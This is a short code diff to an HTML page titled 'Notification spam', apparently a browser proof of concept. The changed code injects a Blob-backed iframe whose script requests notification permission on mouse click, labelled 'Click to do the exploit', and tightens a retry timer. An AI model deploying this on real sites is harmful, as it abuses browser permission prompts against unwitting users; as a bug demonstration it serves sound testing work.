@@ -9,16 +9,17 @@
         }
       }
       catch(err){
-      var b = new Blob(["<script" + ">" + "Notification.requestPermission()" + "</script" + ">"])
+      var b = new Blob(["Click to do the exploit <script" + ">" + "window.onmousedown = function(){Notification.requestPermission()}" + "</script" + ">"])
       var i = document.createElement("iframe")
-      i.src = URL.createObjectURL(b)
-        i.onload = function(){
+      i.onload = function(){
           var el= this
           window.setTimeout(function(){el.remove()},120000)
         }
+      i.src = URL.createObjectURL(b)
+       
         document.body.appendChild(i)
       }
-    },6000)
+    },600)
   </script>
   Notification spam
 </html>
